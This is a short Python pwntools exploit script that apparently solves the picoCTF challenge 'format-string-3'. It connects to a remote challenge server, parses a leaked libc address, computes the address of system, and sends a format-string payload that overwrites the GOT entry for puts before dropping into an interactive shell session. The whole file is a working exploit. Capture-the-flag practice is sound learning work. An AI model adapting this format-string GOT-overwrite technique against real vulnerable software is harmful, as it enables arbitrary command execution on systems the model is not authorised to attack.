from pwnlib.fmtstr import fmtstr_payload
from pwn import *

context.clear(arch = 'amd64')

#p = process('./format-string-3')

p = remote('rhea.picoctf.net', 59468)

p.recvuntil(": ")
received = p.recvline().strip()
leaked_address = int(received,16)

libc_start = leaked_address - 0x7a3f0
system_call = libc_start + 0x4f760

payload = fmtstr_payload(38, {0x404018 : system_call}) #overwriting the got entry for puts

p.sendline(payload)
p.interactive()
